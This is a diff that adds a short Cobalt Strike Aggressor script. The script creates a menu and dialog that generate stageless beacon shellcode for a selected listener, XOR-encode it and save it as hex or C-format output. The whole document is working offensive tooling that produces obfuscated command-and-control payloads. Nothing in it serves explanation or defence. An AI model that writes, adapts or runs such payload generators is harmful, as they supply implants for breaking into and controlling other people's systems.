@@ -1,0 +1,38 @@
+# Author: @归零
+
+menubar("shellcode Generator", "shellcodeGenerator");
+
+sub ready {
+	$xorRawShellcode = encode($1, "xor", $arch);
+	$stagelessShellcode = transform($xorRawShellcode, $format);
+	prompt_file_save("shellcode".$arch.".txt", {
+		local('$handle');
+		$handle = openf(">$1");
+		writeb($handle, $stagelessShellcode);
+		closef($handle);
+		$filename = $1;
+		show_message("please checkfile: ".$filename);
+	});
+}
+
+sub stageless_generator {
+	global('%options $format $arch');
+	%options = $3;
+	$format = iff(%options["format"] eq "HEX", "hex", "veil");
+	$arch = iff(%options["x64"] eq "true", "x64", "x86");
+	artifact_stageless(%options["listener"], "raw", $arch, "", &ready);
+}
+
+popup shellcodeGenerator {
+	item "&stageless shellcode Generator" {
+		$dialog = dialog("stageless shellcode Generator", "", &stageless_generator);
+		dialog_description($dialog, "A stageless shellcode Generator");
+		drow_listener_stage($dialog, "listener", "Listener: ");
+		drow_combobox($dialog, "format", "Output", @("HEX", "C"));
+		drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+		dbutton_action($dialog, "Generate");
+		dialog_show($dialog);
+	}
+}
+
+
